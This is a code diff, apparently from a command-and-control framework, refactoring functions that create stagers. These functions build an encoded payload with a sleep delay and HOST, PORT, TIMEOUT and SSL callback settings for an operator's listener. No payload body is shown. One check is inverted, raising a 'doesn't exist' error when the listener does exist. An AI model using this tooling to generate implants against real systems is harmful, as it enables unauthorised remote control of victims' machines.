@@ -35,7 +35,7 @@ def add_stager(name: str, listener_id: int,
     listener: ListenerModel = db_session.query(
         ListenerModel).filter_by(listener_id=listener_id).first()
     if listener is not None:
-        raise Exception(f"Listener with ID {listener.listener_id} doesn't exist.")
+        raise Exception(f"Listener with ID {listener.id} doesn't exist.")
     
     # Save the Stager to the Database
     stager = StagerModel(
@@ -62,17 +62,13 @@ def get_stager(stager_db: StagerModel, one_liner: bool = True) -> str:
 
     """
 
-
-    listener: ListenerModel = db_session.query(
-        ListenerModel).filter_by(listener_id=stager_db.listener_id).first()
-
-    if listener is None:
+    if stager_db.listener is None:
         raise Exception("Couldn't find the listener.")
-    if listener.listener_type not in AVAILABLE_STAGERS: # also works as the stager type
-        raise Exception(f"Stager {listener.listener_type} is not available.")
+    if stager_db.listener.listener_type not in AVAILABLE_STAGERS: # also works as the stager type
+        raise Exception(f"Stager {stager_db.listener.listener_type} is not available.")
     # Get the Payload from the File
     try:
-        with open("Payloads/" + listener.listener_type + ".py", "r") as f:
+        with open("Payloads/" + stager_db.listener.listener_type + ".py", "r") as f:
             payload = f.read()
     except:
         raise Exception("Couldn't find the payload.")
@@ -92,10 +88,10 @@ def get_stager(stager_db: StagerModel, one_liner: bool = True) -> str:
     # Replace the Payload
     finished_payload = start + "\n"
     finished_payload += f"import time\ntime.sleep({stager_db.delay})\n"
-    finished_payload += f"HOST = '{listener.address}'\n" \
-        f"PORT = {listener.port}\n" \
+    finished_payload += f"HOST = '{stager_db.listener.address}'\n" \
+        f"PORT = {stager_db.listener.port}\n" \
         f"TIMEOUT = {stager_db.timeout}\n" \
-        f"SSL={listener.ssl}\n"
+        f"SSL={stager_db.listener.ssl}\n"
     finished_payload += payload + "\n" + end
 
     # Encode the Payload
